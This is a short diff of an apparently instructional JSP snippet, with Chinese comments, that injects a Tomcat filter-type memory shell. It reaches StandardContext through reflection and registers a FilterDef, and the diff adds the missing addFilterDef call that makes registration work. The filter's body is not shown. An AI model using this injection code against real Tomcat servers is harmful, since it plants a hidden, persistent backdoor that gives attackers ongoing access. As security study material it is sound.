@@ -189,19 +189,20 @@ public class FilterTest implements Filter {
 %>
 
 <%
-    String filterName = "FilterTest";
     // 获取StandardContext对象
     Field field = request.getClass().getDeclaredField("request");
     field.setAccessible(true);
     Request req = (Request) field.get(request);
     StandardContext standardContext = (StandardContext) req.getContext();
 
+    String filterName = "FilterTest";
     // 利用FilterDef对filter进行封装
     FilterTest filterTest = new FilterTest();
     FilterDef filterDef = new FilterDef();
     filterDef.setFilter(filterTest);
     filterDef.setFilterName(filterName);
     filterDef.setFilterClass(filterTest.getClass().getName());
+    standardContext.addFilterDef(filterDef);
 
     // 创建FilterMap，将filterName和urlPatterns进行绑定
     FilterMap filterMap = new FilterMap();
